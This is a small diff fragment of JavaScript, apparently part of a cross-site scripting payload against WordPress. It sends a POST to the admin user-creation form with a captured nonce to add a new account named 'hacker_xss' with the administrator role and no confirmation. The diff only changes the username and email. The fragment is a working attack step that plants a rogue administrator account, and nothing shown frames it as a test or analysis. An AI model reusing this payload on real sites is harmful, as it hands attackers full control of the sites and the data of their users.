@@ -5,8 +5,8 @@
       headers:{'Content-Type':'application/x-www-form-urlencoded'},
       body:'action=createuser&_wpnonce_create-user='+n+
            '&_wp_http_referer=%2Fwp-admin%2Fuser-new.php'+
-           '&user_login=hacker'+
-           '&email=hacker%40mail.com'+
+           '&user_login=hacker_xss'+
+           '&email=hacker2%40mail.com'+
            '&role=administrator'+
            '&noconfirmation=1'+
            '&createuser=Add+User'
